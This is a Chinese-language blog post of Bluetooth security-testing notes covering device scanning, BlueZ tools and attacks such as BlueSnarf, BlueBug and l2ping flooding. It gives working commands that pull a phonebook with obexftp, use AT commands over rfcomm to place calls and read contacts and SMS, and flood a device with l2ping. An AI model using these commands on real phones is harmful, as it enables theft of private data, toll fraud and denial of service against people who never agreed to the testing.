---
layout: post
title: 蓝牙安全测试总结
description: "进行蓝牙协议安全测试的一些记录"
category: scanner
tags: [scanner,bluetooth]
imagefeature: http://7xwdx7.com1.z0.glb.clouddn.com/5551e1cabd3bb.jpg
comments: true
share: true
---

# 蓝牙安全测试总结

### 蓝牙攻击分类
+ _蓝牙扫描_

    >通过查看其中对应设备属性来识别目标蓝牙设备类型外，还可以通过分析通信中的蓝牙数据包来获知 目标设备类型

    - hcitool scan

        只能发现处于可见状态下的蓝牙设备
    - BTScanner

        BTScanner提供了被称为brute force的暴力扫描模式，在该模式下可以发现那些处于不可见状态下的蓝牙设备
    - 通过检测的设备名识别
    - 通过MAC地址识别制造商

        各个厂商被分配的地址范围可以从IEEE的OUI数据库进行查询，地址是<http://standards.ieee.org/regauth/oui/index.shtml>
    - 验证蓝牙设备指纹

        每种蓝牙设备提供的服务以及应答服务查询的方式都各不相同，所以可以通过匹配目标设备返回的信息来确认设备的型号，这种方法与NMAP程序识别计算机操作系统的方法非常类似。
        在btdsd项目所属的页面http://www.betaversion.net/btdsd/db发布了很多蓝牙手机的指纹，这些指纹也包含在BluePrint工具的数据库当中。周利进入到BluePrint程序所在的目录，执行了如下的命令：sdp browse --tree 00:13:EF:F0:D5:06 | ./bp.pl 00:13:EF:F0:D5:06。这里的sdp是Linux系统下的SDP（服务发现协议）工具，可以用于查询蓝牙设备的服务状态。

+ _模块漏洞利用_

    - bluebugger
    - AT

+ _暴力破解_

+ _交互数据嗅探_

    -  因为从理论上而言，任何人都可以截获周围几米内正在传输的蓝牙通讯数据，也就是说，只要使用特定的设备，怀有恶意的攻击者是可以进行拦截、伪造、破坏正常的蓝牙通讯，这种攻击方式也就是我们常常提到的Sniff嗅探攻击

### 蓝牙攻击方式

>发送大量伪造的连接请求，使被攻击方资源耗尽(CPU满负荷或内存不足)的攻击方式。服务器端将为了维护一个非常大的半连接列表而消耗非常多的资源。即使是简单的保存并遍历也会消耗非常多的CPU时间和内存。

>一个特定的蓝牙设备属于一个特定的人，那么这个人的习性和活动就会和该设备地址有很高的关联性。而蓝牙设备地址又是公开的，人们可以通过人机接(ManMachineInterface,MMI)的交互取得,也可以通过蓝牙的查询规则自动获得。当蓝牙设备和另一个蓝牙设备进行通信时，人们很容易发现这个蓝牙设备地址。如果跟踪和监视这个设备地址，比如在什么时间什么地方出现，就会使该设备的所有者的隐私权处于易受攻击的地位。

1. 攻击的前提是获得蓝牙的地址，通过backtrack3的btscanner工具可以查到处于隐藏状态下，但是蓝牙是开启状态的设备。

2. 利用搜索到的蓝牙地址和设备，用bss进行攻击，具体方法为在很短的间隔内发送大量的连接请求，使被攻击方忙于应答，造成他与原先已经连接的设备断开。

3. 利用ObexPush信道和bluebugger工具窃取手机内部信息和盗打电话。

+ _BlueSnarf攻击_
  >这是针对蓝牙设备最常见的攻击方法。这种攻击是基于这样一种原理：通过连接到蓝牙设备的OPP（对象交换传输规格）可以在设备之间交换各种信息，例如电话簿等等，由于厂商的原因一些型号的蓝牙设备存在脆弱点，使攻击者可以在无须认证的情况下连接到这些设备上下载设备中的资料。
  - obexftp
    >是用于访问移动设备存储器的工具程序

    `obexftp -b 00:0A:D9:15:0B:1C -B 10 -g telecom/pb.vcf`

+ _BlueBug攻击_
  >与BlueSnarf一样，一些存在问题的手机可能会被攻击者通过AT命令操纵，攻击者除了可以下载手机中的信息之外，还可以操纵手机进行拨号、短信发送和互联网访问等活动
  - AT命令

+ _BACKDOOR攻击_  
  >攻击者还可以通过一些社交工程手段在某些型号的手机里留下后门，其前提是攻击者与目标建立了合法的连接。然后攻击者可以告知目标手机连接已被关闭但依然能在目标手机用户不知情的情况下通过该链路访问目标手机

+ _Bluejacking攻击_
Bluez
===
  > 蓝牙协议栈在Linux的实现是BlueZ，大多数Linux发行版都默认安装，如Kali默认安装，BlueZ有一些简单的工具，我们可以用来管理和Hack蓝牙。

  - hciconfig
    >使用它来启动蓝牙接口（hci0），查询设备的规格。
      >>激活设备：`hciconfig hci0 up`
  - hcitool
    >查询工具。 可以用来查询设备名称，设备ID，设备类别和设备时钟。
      >>hcitool scan
  - hcidump
    > 可以使用这个来嗅探蓝牙通信
  - l2ping
    `l2ping MAC地址`
    >测试与该设备的蓝牙模块之间是否数据可达
  - sdptool
    `sdptool browse MAC地址`
    >为了获取手机的控制权，需要连接目标设备的串行端口。所以需要通过蓝牙来搜索关于 串行端口的服务。这里需要使用到sdptool工具

### SDP工具使用

1. 查找周边所有的蓝牙设备
>hcitool scan

2. 浏览地址为9C:99:A0:0A:EE:3A的红米2A手机所提供的所有服务
>sdptool browse 9C:99:A0:0A:EE:3A

3. 当有些设备不提供服务浏览查询则用一下方法查找:
>sdptool search --bdaddr 9C:99:A0:0A:EE:3A HFAG
    也可以用 0x111f 代替 HFAG
>sdptool search --bdaddr 9C:99:A0:0A:EE:3A0x111f

4. 查找周边所有能提供HFAG服务的设备:
>sdptool search --bdaddr 9C:99:A0:0A:EE:3A HFAG

5. 设置SDP:
>sdptool add SP

其中sdptool add SP默认使用的是channel 1，如果设置其他具体的channel就应该是  sdptool add --channel=x SP,x就是未使用的channel号.

### 使用蓝牙设备进行配对连接

运行hciconfig可以看到：

~~~
    hci0:   Type: BR/EDR  Bus: USB
        BD Address: 28:B2:BD:4F:6A:63  ACL MTU: 8192:128  SCO MTU: 64:128
        UP RUNNING
        RX bytes:503 acl:0 sco:0 events:22 errors:0
        TX bytes:336 acl:0 sco:0 commands:22 errors:0
~~~

从上图可以看出，我们的蓝牙设备是hci0

运行hcitool dev可以看到我们的蓝牙设备的硬件地址

运行hcitool --help可以查看更多相关命令

* 激活自己的蓝牙
    `sudo hciconfig hci0 up`
要注意的是，激活前蓝牙必须是打开的，否则会出现错误：

* 扫描附近的设备

~~~
    hcitool scan

    root@kali:~# hcitool scan
    Scanning ...
    00:13:EF:10:xx:xx   Columbus GPS
    00:1C:D4:C9:xx:xx   n/a
    84:DB:AC:15:xx:xx   HUAWEI MT7
    可以看到，发现了我手机的蓝牙了~~
~~~

* 连接设备

运行rfcomm --help 可以查看用法

首先需要绑定目的蓝牙设备：

    `sudo rfcomm bind /dev/rfcomm0 E0:A6:70:8C:xx:xx`
注意：上面的这个地址是目的蓝牙设备的硬件地址

接着我们连接它：

    `sudo cat >/dev/rfcomm0`
这是目的蓝牙主机就会弹出一个对话框要求输入pin码，然后主机就会弹出一个对话框，只要输入的和刚才一致就可以通过验证。之后我们发现我的手机已经显示了成功配对的标记了。

* 断开连接

删除绑定（否则在下次使用时会提示设备正忙），命令如下：

    `sudo rfcomm release /dev/rfcomm0`


### 查看蓝牙设备是否开放串口

1. `hcitool scan `
2. `l2ping MAC addr.`
3. `sdptool browse MAC addr. | grep -i "Serial Port0"`

     记录serial port服务的channel

4. `vim /etc/bluetooth/rfcomm.conf`

        rfcomm0 {
            bind no;
            device MAC addr.;
            channel 10;
            comment "xxxxxx";

        }
5. `rfcomm bind /dev/rfcomm0 MAC addr.`
6. `minicom -m -s`     /dev/rfcomm0

7. `minicom -m`
8. `atdt phone no.拨打电话`
9.  `at+cpbr=1,100 获得手机通讯录`
10. `at+cmgl 获得短信`

### l2ping的DDOS

>早期的攻击方式： 向目标主机发送大量畸形的ICMP数据包的方式，使得目标计算机忙于响 应从而达到资源耗尽死机的目的

  `l2ping -f MAC addr.s`
